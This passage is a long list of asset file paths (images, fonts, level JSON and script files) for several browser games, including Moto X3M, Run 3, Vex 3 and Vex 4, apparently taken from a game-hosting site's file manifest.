tlases/x1/garage.png","/src/moto-x3m-spooky-land/assets/atlases/x1/theme0.json","/src/moto-x3m-spooky-land/assets/atlases/x1/theme0.png","/src/moto-x3m-spooky-land/assets/fonts/AllerDisplay/AllerDisplay.woff","/src/moto-x3m-spooky-land/assets/fonts/CfCrackBold/cfcrackandbold.woff","/src/moto-x3m-spooky-land/assets/fonts/Impact/impact.woff","/src/moto-x3m-spooky-land/assets/images/x1/bikes_texture.png","/src/moto-x3m-spooky-land/assets/images/x1/menu_texture.png","/src/moto-x3m-winter/assets/atlases/x1/cars_game.json","/src/moto-x3m-winter/assets/atlases/x1/cars_game.png","/src/moto-x3m-winter/assets/atlases/x1/garage.json","/src/moto-x3m-winter/assets/atlases/x1/garage.png","/src/moto-x3m-winter/assets/atlases/x1/theme0.json","/src/moto-x3m-winter/assets/atlases/x1/theme0.png","/src/moto-x3m-winter/assets/fonts/AllerDisplay/AllerDisplay.woff","/src/moto-x3m-winter/assets/fonts/CfCrackBold/cfcrackandbold.woff","/src/moto-x3m-winter/assets/fonts/Impact/impact.woff","/src/moto-x3m-winter/assets/images/x1/bikes_texture.png","/src/moto-x3m-winter/assets/images/x1/menu_texture.png","/src/ritz/flixel/flixel-ui/img/box.png","/src/ritz/flixel/flixel-ui/img/button.png","/src/ritz/flixel/flixel-ui/img/button_arrow_down.png","/src/ritz/flixel/flixel-ui/img/button_arrow_left.png","/src/ritz/flixel/flixel-ui/img/button_arrow_right.png","/src/ritz/flixel/flixel-ui/img/button_arrow_up.png","/src/ritz/flixel/flixel-ui/img/button_thin.png","/src/ritz/flixel/flixel-ui/img/button_toggle.png","/src/ritz/flixel/flixel-ui/img/check_box.png","/src/ritz/flixel/flixel-ui/img/check_mark.png","/src/ritz/flixel/flixel-ui/img/chrome.png","/src/ritz/flixel/flixel-ui/img/chrome_flat.png","/src/ritz/flixel/flixel-ui/img/chrome_inset.png","/src/ritz/flixel/flixel-ui/img/chrome_light.png","/src/ritz/flixel/flixel-ui/img/dropdown_mark.png","/src/ritz/flixel/flixel-ui/img/finger_big.png","/src/ritz/flixel/flixel-ui/img/finger_small.png","/src/ritz/flixel/flixel-ui/img/hilight.png","/src/ritz/flixel/flixel-ui/img/invis.png","/src/ritz/flixel/flixel-ui/img/minus_mark.png","/src/ritz/flixel/flixel-ui/img/plus_mark.png","/src/ritz/flixel/flixel-ui/img/radio.png","/src/ritz/flixel/flixel-ui/img/radio_dot.png","/src/ritz/flixel/flixel-ui/img/swatch.png","/src/ritz/flixel/flixel-ui/img/tab.png","/src/ritz/flixel/flixel-ui/img/tab_back.png","/src/ritz/flixel/flixel-ui/img/tooltip_arrow.png","/src/ritz/flixel/flixel-ui/xml/defaults.xml","/src/ritz/flixel/flixel-ui/xml/default_loading_screen.xml","/src/ritz/flixel/flixel-ui/xml/default_popup.xml","/src/ritz/flixel/images/logo/default.png","/src/ritz/flixel/images/ui/button.png","/src/run-3/img/cutscene/Candy/Balloon.png","/src/run-3/img/cutscene/Conspiracy/Angel.png","/src/run-3/img/cutscene/Conspiracy/Gentleman.png","/src/run-3/img/cutscene/Conspiracy/Pastafarian.png","/src/run-3/img/cutscene/Conspiracy/Runner.png","/src/run-3/img/cutscene/Conspiracy/Skater.png","/src/run-3/img/cutscene/Conspiracy/Student.png","/src/run-3/img/cutscene/TrainRide/Balloon.png","/src/run-3/img/cutscene/TrainRide/Spritesheet.json","/src/run-3/img/cutscene/TrainRide/Spritesheet.png","/src/run-3/img/menu/characterselection/Angel.png","/src/run-3/img/menu/characterselection/AngelFront.png","/src/run-3/img/menu/characterselection/Bunny.png","/src/run-3/img/menu/characterselection/BunnyFront.png","/src/run-3/img/menu/characterselection/Child.png","/src/run-3/img/menu/characterselection/ChildFront.png","/src/run-3/img/menu/characterselection/Climber.png","/src/run-3/img/menu/characterselection/Duplicator.png","/src/run-3/img/menu/characterselection/DuplicatorFront.png","/src/run-3/img/menu/characterselection/Gentleman.png","/src/run-3/img/menu/characterselection/GentlemanFront.png","/src/run-3/img/menu/characterselection/Ghost.png","/src/run-3/img/menu/characterselection/GhostFront.png","/src/run-3/img/menu/characterselection/IceSkater.png","/src/run-3/img/menu/characterselection/IceSkaterFront.png","/src/run-3/img/menu/characterselection/JackOLantern.png","/src/run-3/img/menu/characterselection/JackOLanternFront.png","/src/run-3/img/menu/characterselection/Lizard.png","/src/run-3/img/menu/characterselection/LizardFront.png","/src/run-3/img/menu/characterselection/LizardFrontSleepy.png","/src/run-3/img/menu/characterselection/LockedCharacterOverlay.png","/src/run-3/img/menu/characterselection/Ninja.png","/src/run-3/img/menu/characterselection/NinjaFront.png","/src/run-3/img/menu/characterselection/Pastafarian.png","/src/run-3/img/menu/characterselection/PastafarianFront.png","/src/run-3/img/menu/characterselection/Pirate.png","/src/run-3/img/menu/characterselection/PirateFront.png","/src/run-3/img/menu/characterselection/Random.png","/src/run-3/img/menu/characterselection/RandomFront.png","/src/run-3/img/menu/characterselection/Runner.png","/src/run-3/img/menu/characterselection/RunnerFront.png","/src/run-3/img/menu/characterselection/Skater.png","/src/run-3/img/menu/characterselection/SkaterFront.png","/src/run-3/img/menu/characterselection/Skier.png","/src/run-3/img/menu/characterselection/SkierFront.png","/src/run-3/img/menu/characterselection/SleepingCharacterOverlay.png","/src/run-3/img/menu/characterselection/Student.png","/src/run-3/img/menu/characterselection/StudentFront.png","/src/run-3/img/menu/holiday/CandyCorn.png","/src/run-3/img/menu/holiday/Egg.png","/src/run-3/img/menu/holiday/Present.png","/src/run-3/img/singledpi/texture/Acceleration.png","/src/run-3/img/singledpi/texture/Arrow.png","/src/run-3/img/singledpi/texture/Balloon.png","/src/run-3/img/singledpi/texture/Battery.png","/src/run-3/img/singledpi/texture/Box.png","/src/run-3/img/singledpi/texture/Candy.png","/src/run-3/img/singledpi/texture/CandyCorn.png","/src/run-3/img/singledpi/texture/CrumblingTile.png","/src/run-3/img/singledpi/texture/IceTile.png","/src/run-3/img/singledpi/texture/MapWithTeapot.png","/src/run-3/img/singledpi/texture/Plus.png","/src/run-3/img/singledpi/texture/RGSkybox0.png","/src/run-3/img/singledpi/texture/RGSkybox1.png","/src/run-3/img/singledpi/texture/RGSkybox2.png","/src/run-3/img/singledpi/texture/RGSkybox3.png","/src/run-3/img/singledpi/texture/RGSkybox4.png","/src/run-3/img/singledpi/texture/RGSkybox5.png","/src/run-3/img/singledpi/texture/RuinedTile.png","/src/run-3/img/singledpi/texture/Skybox0.png","/src/run-3/img/singledpi/texture/Skybox1.png","/src/run-3/img/singledpi/texture/Skybox2.png","/src/run-3/img/singledpi/texture/Skybox3.png","/src/run-3/img/singledpi/texture/Skybox4.png","/src/run-3/img/singledpi/texture/Skybox5.png","/src/run-3/img/singledpi/texture/WarningStripes.png","/src/run-3/img/singledpi/texture/Wormhole.png","/src/run-3/text/content/explore/childAchieve.json","/src/run-3/text/content/explore/early0.json","/src/run-3/text/content/explore/earlyAchieve.json","/src/run-3/text/content/explore/homeAchieve.json","/src/run-3/text/content/explore/homeAchieve1.json","/src/run-3/text/content/explore/homeImage.json","/src/run-3/text/content/explore/homewards0.json","/src/run-3/text/content/explore/homewards1.json","/src/run-3/text/content/explore/onwards0.json","/src/run-3/text/content/explore/onwards1.json","/src/run-3/text/content/explore/onwardsAchieve.json","/src/run-3/text/content/infinite/infiniteAchieve.json","/src/running-bot-xmas-gifts/assets/data/genocide/commands.json","/src/running-bot-xmas-gifts/assets/data/genocide/genocide-easy.json","/src/running-bot-xmas-gifts/assets/data/genocide/genocide-hard.json","/src/running-bot-xmas-gifts/assets/data/genocide/genocide.json","/src/running-bot-xmas-gifts/assets/data/genocide/genocideDialogue.txt","/src/running-bot-xmas-gifts/assets/data/last-chance/last-chance-easy.json","/src/running-bot-xmas-gifts/assets/data/last-chance/last-chance-hard.json","/src/running-bot-xmas-gifts/assets/data/last-chance/last-chance.json","/src/running-bot-xmas-gifts/assets/data/last-chance/last-chanceDialogue.txt","/src/running-bot-xmas-gifts/assets/data/my-battle/my-battle-easy.json","/src/running-bot-xmas-gifts/assets/data/my-battle/my-battle-hard.json","/src/running-bot-xmas-gifts/assets/data/my-battle/my-battle.json","/src/running-bot-xmas-gifts/assets/data/my-battle/my-battleDialogue.txt","/src/running-bot-xmas-gifts/assets/images/buttons/leaderboard.png","/src/running-bot-xmas-gifts/assets/images/buttons/replay.png","/src/running-bot-xmas-gifts/assets/images/buttons/upgrade.png","/src/running-bot-xmas-gifts/assets/images/buttons/video-icon.png","/src/running-bot-xmas-gifts/assets/images/common/icon.png","/src/running-bot-xmas-gifts/assets/images/common/loading.svg","/src/running-bot-xmas-gifts/assets/images/game/heart.png","/src/running-bot-xmas-gifts/assets/images/game/magnet.png","/src/running-bot-xmas-gifts/assets/images/game/mushroom.png","/src/running-bot-xmas-gifts/assets/images/menu/bgm-off.png","/src/running-bot-xmas-gifts/assets/images/menu/bgm-on.png","/src/running-bot-xmas-gifts/assets/images/menu/bt-moregames.png","/src/running-bot-xmas-gifts/assets/images/menu/en.png","/src/running-bot-xmas-gifts/assets/images/menu/ru.png","/src/running-bot-xmas-gifts/assets/images/menu/sfx-off.png","/src/running-bot-xmas-gifts/assets/images/menu/sfx-on.png","/src/running-bot-xmas-gifts/assets/images/menucharacter/campaign_menu_UI_characters.png","/src/running-bot-xmas-gifts/assets/images/menucharacter/campaign_menu_UI_characters.xml","/src/running-bot-xmas-gifts/assets/images/menucharacter/tabi.png","/src/running-bot-xmas-gifts/assets/images/menucharacter/tabi.xml","/src/running-bot-xmas-gifts/assets/images/shop/arrow.png","/src/running-bot-xmas-gifts/assets/images/shop/coin.png","/src/running-bot-xmas-gifts/assets/images/shop/heart.png","/src/running-bot-xmas-gifts/assets/images/shop/magnet.png","/src/running-bot-xmas-gifts/assets/images/shop/shield.png","/src/running-bot-xmas-gifts/assets/images/storymenu/week0.png","/src/running-bot-xmas-gifts/assets/images/tutorial/arrow-left.png","/src/running-bot-xmas-gifts/assets/images/tutorial/arrow-right.png","/src/running-bot-xmas-gifts/assets/images/tutorial/arrow-up.png","/src/running-bot-xmas-gifts/assets/images/tutorial/move.png","/src/running-bot-xmas-gifts/assets/images/tutorial/swipe-up.png","/src/running-bot-xmas-gifts/assets/preload/data/characterList.txt","/src/running-bot-xmas-gifts/assets/preload/data/controls.txt","/src/running-bot-xmas-gifts/assets/preload/data/data-goes-here.txt","/src/running-bot-xmas-gifts/assets/preload/data/freeplaySonglist.txt","/src/running-bot-xmas-gifts/assets/preload/data/introText.txt","/src/running-bot-xmas-gifts/assets/preload/data/specialThanks.txt","/src/running-bot-xmas-gifts/assets/preload/images/virtual-input.txt","/src/running-bot-xmas-gifts/assets/shared/images/images-go-here.txt","/src/running-bot-xmas-gifts/assets/shared/sounds/sounds-go-here.txt","/src/spaceinvaders/assets/javascript/built/main-built.js","/src/spaceinvaders/assets/javascript/lib/phaser-no-physics.min.js","/src/spaceinvaders/assets/javascript/lib/require.js","/src/spaceinvaders/assets/javascript/module/Aliens.js","/src/spaceinvaders/assets/javascript/module/Background.js","/src/spaceinvaders/assets/javascript/module/Bullets.js","/src/spaceinvaders/assets/javascript/module/Explosions.js","/src/spaceinvaders/assets/javascript/module/HUD.js","/src/spaceinvaders/assets/javascript/module/Level.js","/src/spaceinvaders/assets/javascript/module/Player.js","/src/spaceinvaders/assets/javascript/state/End.js","/src/spaceinvaders/assets/javascript/state/Load.js","/src/spaceinvaders/assets/javascript/state/Play.js","/src/spaceinvaders/assets/javascript/state/Start.js","/src/superhot/img/cutscene/TrainRide/Balloon.png","/src/superhot/img/cutscene/TrainRide/Spritesheet.json","/src/superhot/img/cutscene/TrainRide/Spritesheet.png","/src/superhot/img/menu/characterselection/Angel.png","/src/superhot/img/menu/characterselection/AngelFront.png","/src/superhot/img/menu/characterselection/Bunny.png","/src/superhot/img/menu/characterselection/BunnyFront.png","/src/superhot/img/menu/characterselection/Child.png","/src/superhot/img/menu/characterselection/ChildFront.png","/src/superhot/img/menu/characterselection/Climber.png","/src/superhot/img/menu/characterselection/Duplicator.png","/src/superhot/img/menu/characterselection/DuplicatorFront.png","/src/superhot/img/menu/characterselection/Gentleman.png","/src/superhot/img/menu/characterselection/GentlemanFront.png","/src/superhot/img/menu/characterselection/Ghost.png","/src/superhot/img/menu/characterselection/GhostFront.png","/src/superhot/img/menu/characterselection/IceSkater.png","/src/superhot/img/menu/characterselection/IceSkaterFront.png","/src/superhot/img/menu/characterselection/JackOLantern.png","/src/superhot/img/menu/characterselection/JackOLanternFront.png","/src/superhot/img/menu/characterselection/Lizard.png","/src/superhot/img/menu/characterselection/LizardFront.png","/src/superhot/img/menu/characterselection/LizardFrontSleepy.png","/src/superhot/img/menu/characterselection/LockedCharacterOverlay.png","/src/superhot/img/menu/characterselection/Ninja.png","/src/superhot/img/menu/characterselection/NinjaFront.png","/src/superhot/img/menu/characterselection/Pastafarian.png","/src/superhot/img/menu/characterselection/PastafarianFront.png","/src/superhot/img/menu/characterselection/Pirate.png","/src/superhot/img/menu/characterselection/PirateFront.png","/src/superhot/img/menu/characterselection/Random.png","/src/superhot/img/menu/characterselection/RandomFront.png","/src/superhot/img/menu/characterselection/Runner.png","/src/superhot/img/menu/characterselection/RunnerFront.png","/src/superhot/img/menu/characterselection/Skater.png","/src/superhot/img/menu/characterselection/SkaterFront.png","/src/superhot/img/menu/characterselection/Skier.png","/src/superhot/img/menu/characterselection/SkierFront.png","/src/superhot/img/menu/characterselection/SleepingCharacterOverlay.png","/src/superhot/img/menu/characterselection/Student.png","/src/superhot/img/menu/characterselection/StudentFront.png","/src/superhot/img/menu/holiday/CandyCorn.png","/src/superhot/img/menu/holiday/Egg.png","/src/superhot/img/menu/holiday/Present.png","/src/superhot/img/singledpi/texture/Acceleration.png","/src/superhot/img/singledpi/texture/Arrow.png","/src/superhot/img/singledpi/texture/Balloon.png","/src/superhot/img/singledpi/texture/Battery.png","/src/superhot/img/singledpi/texture/Box.png","/src/superhot/img/singledpi/texture/Candy.png","/src/superhot/img/singledpi/texture/CandyCorn.png","/src/superhot/img/singledpi/texture/CrumblingTile.png","/src/superhot/img/singledpi/texture/IceTile.png","/src/superhot/img/singledpi/texture/MapWithTeapot.png","/src/superhot/img/singledpi/texture/Plus.png","/src/superhot/img/singledpi/texture/RGSkybox0.png","/src/superhot/img/singledpi/texture/RGSkybox1.png","/src/superhot/img/singledpi/texture/RGSkybox2.png","/src/superhot/img/singledpi/texture/RGSkybox3.png","/src/superhot/img/singledpi/texture/RGSkybox4.png","/src/superhot/img/singledpi/texture/RGSkybox5.png","/src/superhot/img/singledpi/texture/RuinedTile.png","/src/superhot/img/singledpi/texture/Skybox0.png","/src/superhot/img/singledpi/texture/Skybox1.png","/src/superhot/img/singledpi/texture/Skybox2.png","/src/superhot/img/singledpi/texture/Skybox3.png","/src/superhot/img/singledpi/texture/Skybox4.png","/src/superhot/img/singledpi/texture/Skybox5.png","/src/superhot/img/singledpi/texture/WarningStripes.png","/src/superhot/img/singledpi/texture/Wormhole.png","/src/vex3/assets/images/blocks/achievement-progress-bar.png","/src/vex3/assets/images/blocks/act-block-1.png","/src/vex3/assets/images/blocks/act-block-10.png","/src/vex3/assets/images/blocks/act-block-2.png","/src/vex3/assets/images/blocks/act-block-3.png","/src/vex3/assets/images/blocks/act-block-4.png","/src/vex3/assets/images/blocks/act-block-5.png","/src/vex3/assets/images/blocks/act-block-6.png","/src/vex3/assets/images/blocks/act-block-7.png","/src/vex3/assets/images/blocks/act-block-8.png","/src/vex3/assets/images/blocks/act-block-9.png","/src/vex3/assets/images/blocks/arrow-animation.png","/src/vex3/assets/images/blocks/arrow-static.png","/src/vex3/assets/images/blocks/basic-block-colors.png","/src/vex3/assets/images/blocks/block-basic.png","/src/vex3/assets/images/blocks/blocked-wall.png","/src/vex3/assets/images/blocks/bounce-block.png","/src/vex3/assets/images/blocks/explosive-block.png","/src/vex3/assets/images/blocks/falling-block.png","/src/vex3/assets/images/blocks/glass-block.png","/src/vex3/assets/images/blocks/horizontal-block.png","/src/vex3/assets/images/blocks/ice-block.png","/src/vex3/assets/images/blocks/invis-block-down.png","/src/vex3/assets/images/blocks/invis-block-up.png","/src/vex3/assets/images/blocks/invis-block.png","/src/vex3/assets/images/blocks/left-slope.png","/src/vex3/assets/images/blocks/lock-block.png","/src/vex3/assets/images/blocks/push-block.png","/src/vex3/assets/images/blocks/slope-colors.png","/src/vex3/assets/images/blocks/solar-block.png","/src/vex3/assets/images/blocks/spark-block.png","/src/vex3/assets/images/blocks/speed-block.png","/src/vex3/assets/images/blocks/swimming-pool.png","/src/vex3/assets/images/blocks/vertical-down-block.png","/src/vex3/assets/images/blocks/vertical-up-block.png","/src/vex3/assets/images/buttons/act-select-logo.png","/src/vex3/assets/images/buttons/act1-button.png","/src/vex3/assets/images/buttons/act10-button.png","/src/vex3/assets/images/buttons/act2-button.png","/src/vex3/assets/images/buttons/act3-button.png","/src/vex3/assets/images/buttons/act4-button.png","/src/vex3/assets/images/buttons/act5-button.png","/src/vex3/assets/images/buttons/act6-button.png","/src/vex3/assets/images/buttons/act7-button.png","/src/vex3/assets/images/buttons/act8-button.png","/src/vex3/assets/images/buttons/act9-button.png","/src/vex3/assets/images/buttons/awesome-stuff-button.png","/src/vex3/assets/images/buttons/back-button.png","/src/vex3/assets/images/buttons/bottom-label-bg.png","/src/vex3/assets/images/buttons/challenge-acts-button.png","/src/vex3/assets/images/buttons/clear-all-button.png","/src/vex3/assets/images/buttons/close-button.png","/src/vex3/assets/images/buttons/completion-button.png","/src/vex3/assets/images/buttons/mute-button.png","/src/vex3/assets/images/buttons/options-logo.png","/src/vex3/assets/images/buttons/options-noclear.png","/src/vex3/assets/images/buttons/pause-button.png","/src/vex3/assets/images/buttons/quality-button.png","/src/vex3/assets/images/buttons/quit-logo.png","/src/vex3/assets/images/buttons/reset-logo.png","/src/vex3/assets/images/buttons/slide-drag.png","/src/vex3/assets/images/buttons/slider.png","/src/vex3/assets/images/buttons/stage-button-bg.png","/src/vex3/assets/images/buttons/standard-acts-button.png","/src/vex3/assets/images/buttons/tick-button.png","/src/vex3/assets/images/buttons/tick_white_box.png","/src/vex3/assets/images/buttons/trophy-logo.png","/src/vex3/assets/images/fonts/grob24.fnt","/src/vex3/assets/images/fonts/grob24.png","/src/vex3/assets/images/fonts/grobred32.fnt","/src/vex3/assets/images/fonts/grobred32.png","/src/vex3/assets/images/fonts/menu-options.png","/src/vex3/assets/images/fonts/menu-play-game.png","/src/vex3/assets/images/gui/game-top-bg.png","/src/vex3/assets/images/gui/level-name-bg.png","/src/vex3/assets/images/gui/rank-time-bg.png","/src/vex3/assets/images/gui/rank-time-static-text.png","/src/vex3/assets/images/gui/simple-transition.png","/src/vex3/assets/images/gui/timer-bg.png","/src/vex3/assets/images/items/breathe-blaster.png","/src/vex3/assets/images/items/cannon-base.png","/src/vex3/assets/images/items/cannon-tube.png","/src/vex3/assets/images/items/checkpoint-swimming.png","/src/vex3/assets/images/items/checkpoint-text.png","/src/vex3/assets/images/items/checkpoint.png","/src/vex3/assets/images/items/finish-portal.png","/src/vex3/assets/images/items/hazard-strips.png","/src/vex3/assets/images/items/key.png","/src/vex3/assets/images/items/light-switch.png","/src/vex3/assets/images/items/pole-red-section.png","/src/vex3/assets/images/items/pole.png","/src/vex3/assets/images/items/star.png","/src/vex3/assets/images/items/timed-key.png","/src/vex3/assets/images/items/wind-blaster.png","/src/vex3/assets/images/items/wind-fan.png","/src/vex3/assets/images/items/wire.png","/src/vex3/assets/images/items/zipline-pole.png","/src/vex3/assets/images/obstacles/buzzsaw-on-stick.png","/src/vex3/assets/images/obstacles/buzzsaw.png","/src/vex3/assets/images/obstacles/classic-laser.png","/src/vex3/assets/images/obstacles/falling-spike.png","/src/vex3/assets/images/obstacles/laser-bullet.png","/src/vex3/assets/images/obstacles/quadrant.png","/src/vex3/assets/images/obstacles/reaper.png","/src/vex3/assets/images/obstacles/shurikan-dispenser.png","/src/vex3/assets/images/obstacles/shurikan-horizontal.png","/src/vex3/assets/images/obstacles/shurikan-spawner.png","/src/vex3/assets/images/obstacles/spark.png","/src/vex3/assets/images/obstacles/spike.png","/src/vex3/assets/images/obstacles/spike10x.png","/src/vex3/assets/images/obstacles/spike30x.png","/src/vex3/assets/images/player/player-crouch.png","/src/vex3/assets/images/player/player-fall.png","/src/vex3/assets/images/player/player-hang.png","/src/vex3/assets/images/player/player-jump-back-flip.png","/src/vex3/assets/images/player/player-jump-down.png","/src/vex3/assets/images/player/player-jump-front-flip.png","/src/vex3/assets/images/player/player-jump.png","/src/vex3/assets/images/player/player-kick.png","/src/vex3/assets/images/player/player-pulley.png","/src/vex3/assets/images/player/player-push.png","/src/vex3/assets/images/player/player-run.png","/src/vex3/assets/images/player/player-scale.png","/src/vex3/assets/images/player/player-slide.png","/src/vex3/assets/images/player/player-spawn.png","/src/vex3/assets/images/player/player-stand.png","/src/vex3/assets/images/player/player-swim-bottom.png","/src/vex3/assets/images/player/player-swim-top.png","/src/vex3/assets/images/player/player-swing.png","/src/vex3/assets/images/text/hell_white_normal.png","/src/vex3/assets/images/text/text-fade-1.png","/src/vex3/assets/images/text/text-fade-10.png","/src/vex3/assets/images/text/text-fade-11.png","/src/vex3/assets/images/text/text-fade-12.png","/src/vex3/assets/images/text/text-fade-13-mobile.png","/src/vex3/assets/images/text/text-fade-13.png","/src/vex3/assets/images/text/text-fade-14.png","/src/vex3/assets/images/text/text-fade-15.png","/src/vex3/assets/images/text/text-fade-16.png","/src/vex3/assets/images/text/text-fade-17.png","/src/vex3/assets/images/text/text-fade-18.png","/src/vex3/assets/images/text/text-fade-19.png","/src/vex3/assets/images/text/text-fade-2.png","/src/vex3/assets/images/text/text-fade-20.png","/src/vex3/assets/images/text/text-fade-21.png","/src/vex3/assets/images/text/text-fade-22.png","/src/vex3/assets/images/text/text-fade-23.png","/src/vex3/assets/images/text/text-fade-24.png","/src/vex3/assets/images/text/text-fade-25.png","/src/vex3/assets/images/text/text-fade-26.png","/src/vex3/assets/images/text/text-fade-27.png","/src/vex3/assets/images/text/text-fade-28.png","/src/vex3/assets/images/text/text-fade-29.png","/src/vex3/assets/images/text/text-fade-30.png","/src/vex3/assets/images/text/text-fade-31.png","/src/vex3/assets/images/text/text-fade-32.png","/src/vex3/assets/images/text/text-fade-33.png","/src/vex3/assets/images/text/text-fade-34.png","/src/vex3/assets/images/text/text-fade-35.png","/src/vex3/assets/images/text/text-fade-36.png","/src/vex3/assets/images/text/text-fade-37.png","/src/vex3/assets/images/text/text-fade-38.png","/src/vex3/assets/images/text/text-fade-39.png","/src/vex3/assets/images/text/text-fade-4.png","/src/vex3/assets/images/text/text-fade-40.png","/src/vex3/assets/images/text/text-fade-41.png","/src/vex3/assets/images/text/text-fade-42.png","/src/vex3/assets/images/text/text-fade-43.png","/src/vex3/assets/images/text/text-fade-44.png","/src/vex3/assets/images/text/text-fade-5.png","/src/vex3/assets/images/text/text-fade-6.png","/src/vex3/assets/images/text/text-fade-7.png","/src/vex3/assets/images/text/text-fade-8.png","/src/vex3/assets/images/windows/achievement-unlocked.png","/src/vex3/assets/images/windows/achievements-window.png","/src/vex3/assets/images/windows/act-select-small.png","/src/vex3/assets/images/windows/act-select-window.png","/src/vex3/assets/images/windows/options-window.png","/src/vex3/assets/images/windows/pause-window-small.png","/src/vex3/assets/images/windows/stuck-window.png","/src/vex4/assets/balance/levels/challenge.json","/src/vex4/assets/balance/levels/hubArrows.json","/src/vex4/assets/balance/levels/level01.json","/src/vex4/assets/balance/levels/level01hard.json","/src/vex4/assets/balance/levels/level02.json","/src/vex4/assets/balance/levels/level02hard.json","/src/vex4/assets/balance/levels/level03.json","/src/vex4/assets/balance/levels/level03hard.json","/src/vex4/assets/balance/levels/level04.json","/src/vex4/assets/balance/levels/level04hard.json","/src/vex4/assets/balance/levels/level05.json","/src/vex4/assets/balance/levels/level05hard.json","/src/vex4/assets/balance/levels/level06.json","/src/vex4/assets/balance/levels/level06hard.json","/src/vex4/assets/balance/levels/level07.json","/src/vex4/assets/balance/levels/level07hard.json","/src/vex4/assets/balance/levels/level08.json","/src/vex4/assets/balance/levels/level08hard.json","/src/vex4/assets/balance/levels/level09.json","/src/vex4/assets/balance/levels/level09hard.json","/src/vex4/assets/balance/levels/level10.json","/src/vex4/assets/balance/levels/levelEdit.json","/src/vex4/assets/balance/levels/levelhub.json","/src/vex4/assets/coco/transition/transition_in.json","/src/vex4/assets/coco/transition/transition_out.json","/src/vex4/assets/coco/transition/transition_stand.json","/src/vex4/assets/fonts/milocha/milocha.ttf","/src/vex4/assets/fonts/milocha/milocha.woff","/src/vex4/assets/images/blocks/act-block-1.png","/src/vex4/assets/images/blocks/act-block-10.png","/src/vex4/assets/images/blocks/act-block-2.png","/src/vex4/assets/images/blocks/act-block-3.png","/src/vex4/assets/images/blocks/act-block-4.png","/src/vex4/assets/images/blocks/act-block-5.png","/src/vex4/assets/images/blocks/act-block-6.png","/src/vex4/assets/images/blocks/act-block-7.png","/src/vex4/assets/images/blocks/act-block-8.png","/src/vex4/assets/images/blocks/act-block-9.png","/src/vex4/assets/images/blocks/act-block-challenge.png","/src/vex4/assets/images/blocks/arrow-animation.png","/src/vex4/assets/images/blocks/arrow-static.png","/src/vex4/assets/images/blocks/basic-block-colors.png","/src/vex4/assets/images/blocks/block-basic.png","/src/vex4/assets/images/blocks/blocked-wall.png","/src/vex4/assets/images/blocks/bounce-block.png","/src/vex4/assets/images/blocks/cable.png","/src/vex4/assets/images/blocks/elevator_down.png","/src/vex4/assets/images/blocks/elevator_up.png","/src/vex4/assets/images/blocks/explosive-block.png","/src/vex4/assets/images/blocks/falling-block.png","/src/vex4/assets/images/blocks/glass-block.png","/src/vex4/assets/images/blocks/horizontal-block.png","/src/vex4/assets/images/blocks/ice-block.png","/src/vex4/assets/images/blocks/invis-block-down.png","/src/vex4/assets/images/blocks/invis-block-up.png","/src/vex4/assets/images/blocks/invis-block.png","/src/vex4/assets/images/blocks/left-slope.png","/src/vex4/assets/images/blocks/lock-block.png","/src/vex4/assets/images/blocks/push-block.png","/src/vex4/assets/images/blocks/slope-colors.png","/src/vex4/assets/images/blocks/solar-block.png","/src/vex4/assets/images/blocks/spark-block.png","/src/vex4/assets/images/blocks/speed-block.png","/src/vex4/assets/images/blocks/swimming-pool.png","/src/vex4/assets/images/blocks/vertical-down-block.png","/src/vex4/assets/images/blocks/vertical-up-block.png","/src/vex4/assets/images/items/breathe-blaster.png","/src/vex4/assets/images/items/cannon-base.png","/src/vex4/assets/images/items/cannon-tube.png","/src/vex4/assets/images/items/checkpoint-swimming.png","/src/vex4/assets/images/items/checkpoint-text.png","/src/vex4/assets/images/items/finish-portal.png","/src/vex4/assets/images/items/hazard-strips.png","/src/vex4/assets/images/items/key.png","/src/vex4/assets/images/items/light-switch.png","/src/vex4/assets/images/items/pole-red-section.png","/src/vex4/assets/images/items/pole.png","/src/vex4/assets/images/items/portal.png","/src/vex4/assets/images/items/star.png","/src/vex4/assets/images/items/timed-key.png","/src/vex4/assets/images/items/wind-blaster.png","/src/vex4/assets/images/items/wind-fan.png","/src/vex4/assets/images/items/wire.png","/src/vex4/assets/images/items/zipline-pole.png","/src/vex4/assets/images/obstacles/buzzsaw-on-stick.png","/src/vex4/assets/images/obstacles/buzzsaw.png","/src/vex4/assets/images/obstacles/classic-laser.png","/src/vex4/assets/images/obstacles/falling-spike.png","/src/vex4/assets/images/obstacles/laser-bullet.png","/src/vex4/assets/images/obstacles/quadrant.png","/src/vex4/assets/images/obstacles/reaper.png","/src/vex4/assets/images/obstacles/shurikan-dispenser.png","/src/vex4/assets/images/obstacles/shurikan-horizontal.png","/src/vex4/assets/images/obstacles/shurikan-spawner.png","/src/vex4/assets/images/obstacles/spark.png","/src/vex4/assets/images/obstacles/spike.png","/src/vex4/assets/images/obstacles/spike10x.png","/src/vex4/assets/images/obstacles/spike30x.png","/src/vex4/assets/images/player/player-crouch.json","/src/vex4/assets/images/player/player-crouch.png","/src/vex4/assets/images/player/player-fall-floor.json","/src/vex4/assets/images/player/player-fall-floor.png","/src/vex4/assets/images/player/player-fall.png","/src/vex4/assets/images/player/player-hang.png","/src/vex4/assets/images/player/player-jump-back-flip.png","/src/vex4/assets/images/player/player-jump-down.json","/src/vex4/assets/images/player/player-jump-down.png","/src/vex4/assets/images/player/player-jump-front-flip.png","/src/vex4/assets/images/player/player-jump.json","/src/vex4/assets/images/player/player-jump.png","/src/vex4/assets/images/player/player-kick.png","/src/vex4/assets/images/player/player-pulley.png","/src/vex4/assets/images/player/player-push.png","/src/vex4/assets/images/player/player-run.json","/src/vex4/assets/images/player/player-run.png","/src/vex4/assets/images/player/player-scale.png","/src/vex4/assets/images/player/player-slide.png","/src/vex4/assets/images/player/player-spawn.png","/src/vex4/assets/images/player/player-stand.png","/src/vex4/assets/images/player/player-stop-swim.json","/src/vex4/assets/images/player/player-stop-swim.png","/src/vex4/assets/images/player/player-swim-bottom.png","/src/vex4/assets/images/player/player-swim-top.json","/src/vex4/assets/images/player/player-swim-top.png","/src/vex4/assets/images/player/player-swing.png","/src/vex4/assets/images/text/text-fade-1.png","/src/vex4/assets/images/text/text-fade-10.png","/src/vex4/assets/images/text/text-fade-11.png","/src/vex4/assets/images/text/text-fade-12.png","/src/vex4/assets/images/text/text-fade-13-mobile.png","/src/vex4/assets/images/text/text-fade-13.png","/src/vex4/assets/images/text/text-fade-14.png","/src/vex4/assets/images/text/text-fade-15.png","/src/vex4/assets/images/text/text-fade-16.png","/src/vex4/assets/images/text/text-fade-17.png","/src/vex4/assets/images/text/text-fade-18.png","/src/vex4/assets/images/text/text-fade-19.png","/src/vex4/assets/images/text/text-fade-2.png","/src/vex